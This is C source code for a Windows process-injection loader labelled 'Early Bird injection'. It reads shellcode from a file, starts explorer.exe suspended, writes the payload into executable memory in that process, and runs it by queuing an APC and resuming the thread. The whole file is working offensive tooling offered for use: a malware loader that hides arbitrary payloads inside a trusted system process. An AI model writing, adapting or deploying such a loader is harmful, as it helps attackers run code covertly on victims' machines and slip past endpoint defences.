#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

void DisplayBanner() {
    printf("\n");
    printf("-----EPIC LOADER INJECTION-----\n");
    printf("BY CHRIS H\n");
    printf("\n");
}

// Function to read shellcode from a file
unsigned char* ReadShellcode(const char* filePath, size_t* outSize) {
    FILE* file;
    if (fopen_s(&file, filePath, "rb") != 0) {
        printf("[ERROR] Failed to open shellcode file: %s\n", filePath);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    size_t fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        printf("[ERROR] Failed to allocate memory for shellcode.\n");
        fclose(file);
        return NULL;
    }

    fread(buffer, 1, fileSize, file);
    fclose(file);

    *outSize = fileSize;
    return buffer;
}

int main(int argc, char* argv[]) {
    DisplayBanner();
    if (argc != 2) {
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    // Read the shellcode from the provided file
    size_t shellcodeSize = 0;
    unsigned char* shellcode = ReadShellcode(argv[1], &shellcodeSize);
    if (!shellcode) {
        return 1;
    }

    printf("[DEBUG] Shellcode read successfully (%zu bytes).\n", shellcodeSize);

    // Create a new suspended explorer.exe process
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    if (!CreateProcess(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[ERROR] Failed to create a new explorer.exe process: %d\n", GetLastError());
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] Suspended explorer.exe process created. PID: %d\n", pi.dwProcessId);

    // Allocate memory for the shellcode in the target process
    LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        printf("[ERROR] VirtualAllocEx failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] Allocated memory in target process.\n");

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(pi.hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        printf("[ERROR] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] Shellcode written to allocated memory.\n");

    // Queue an APC to the main thread of the process
    if (!QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, NULL)) {
        printf("[ERROR] QueueUserAPC failed: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] APC queued successfully. Resuming thread to trigger the shellcode.\n");

    // Resume the thread to execute the shellcode
    ResumeThread(pi.hThread);

    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(shellcode);

    printf("[INFO] Early Bird injection completed successfully.\n");
    return 0;
}
